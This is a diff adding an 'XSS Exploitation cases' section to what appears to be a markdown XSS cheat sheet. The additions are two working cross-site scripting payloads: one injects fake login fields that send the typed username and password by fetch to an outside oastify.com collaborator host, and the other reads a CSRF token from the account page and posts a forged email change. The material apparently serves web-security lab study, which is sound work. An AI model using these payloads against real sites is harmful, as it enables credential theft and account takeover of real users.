@@ -406,3 +406,33 @@ index()
 jQuery.parseHTML()
 $.parseHTML()
 ```
+
+# XSS Exploitation cases
+
+## steal credentials
+
+```js
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://5lrhnj3lgso1cmbjq0cck5h1ksqie7.oastify.com',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
+
+## xss to csrf
+xss to csrf with csrf token
+```js
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
+```
